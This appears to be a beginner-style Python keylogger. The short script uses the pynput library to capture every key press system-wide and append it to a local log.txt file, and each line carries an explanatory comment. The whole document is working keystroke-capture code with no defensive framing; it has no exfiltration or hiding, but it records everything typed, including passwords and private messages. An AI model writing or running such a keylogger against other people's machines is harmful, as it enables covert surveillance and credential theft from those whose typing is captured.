from pynput.keyboard import Listener # Importing Listener from pynput.keyboard


def write_to_file(key):     # Defining the function to write the key to a file
    letter = str(key)    # Converting the key to a string
    letter = letter.replace("'", "")   # Replacing the single quotes with an empty string

    if letter == 'Key.space':  # If the key is a space, then replace it with a space
        letter = ' '
    if letter == 'Key.shift_r':  # If the key is a right shift, then replace it with an empty string
        letter = ''
    if letter == "Key.ctrl_l":  # If the key is a left control, then replace it with an empty string
        letter = ""
    if letter == "Key.enter":  # If the key is an enter key, then replace it with a new line
        letter = "\n"

    with open("log.txt", 'a') as f:  # Opening the file in append mode
        f.write(letter) 

# Collecting events until stopped

with Listener(on_press=write_to_file) as l:  # Using the Listener to listen to the key press events
    l.join()


